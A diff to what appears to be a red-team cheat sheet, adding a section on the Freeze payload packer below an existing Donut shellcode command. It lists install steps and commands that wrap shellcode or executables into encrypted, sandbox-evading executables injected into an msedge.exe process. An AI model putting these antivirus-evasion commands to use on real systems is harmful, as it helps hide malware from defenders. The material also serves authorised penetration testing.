@@ -7,6 +7,7 @@
 - [AMSI](#amsi)
 - [AntiVirus Evasion](#antivirus-evasion)
 - [Donut](#donut)
+- [Freeze](#freeze)
 - [ScareCrow](#scarecrow)
 
 ## Resources
@@ -292,6 +293,33 @@ $ make debug
 
 ```c
 $ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
+```
+
+## Freeze
+
+> https://github.com/Tylous/Freeze
+
+### Installation
+
+```c
+$ git clone https://github.com/Tylous/Freeze
+$ cd Freeze
+$ go build Freeze.go
+```
+
+```c
+$ go get golang.org/x/sys/windows
+```
+
+### Common Commands
+
+```c
+$ ./Freeze -I <FILE>.bin -O <FILE>.exe
+$ ./Freeze -I <FILE>.exe -O <FILE>.exe
+$ ./Freeze -I <FILE>.bin -encrypt -sandbox -O <FILE>.exe
+$ ./Freeze -I <FILE>.exe -encrypt -sandbox -O <FILE>.exe
+$ ./Freeze -I <FILE>.bin -encrypt -sandbox -process "C:\\Windows\\System32\\msedge.exe" -O <FILE>.exe
+$ ./Freeze -I <FILE>.exe -encrypt -sandbox -process "C:\\Windows\\System32\\msedge.exe" -O <FILE>.exe
 ```
 
 ## ScareCrow
